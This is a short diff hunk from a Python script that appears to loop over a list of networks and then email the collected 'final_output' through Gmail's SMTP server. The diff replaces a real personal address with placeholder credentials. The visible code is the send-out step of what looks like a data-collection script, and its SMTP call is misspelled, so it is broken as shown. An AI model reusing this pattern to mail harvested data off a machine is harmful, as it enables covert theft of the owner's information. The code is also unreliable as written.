@@ -14,6 +14,6 @@ for network in network_list:
 
 server = smtplismtp("smtp.gmail.com", 587)
 server.starttls()
-server.login("vipulvyas0813@gmail.com","")
-server.sendmail("vipulvyas0813@gmail.com","vipulvyas0813@gmail.com",final_output)
+server.login("Yourmail@gmail.com","Password")
+server.sendmail("Yourmail@gmail.com","Yourmail@gmail.com",final_output)
 server.quit()
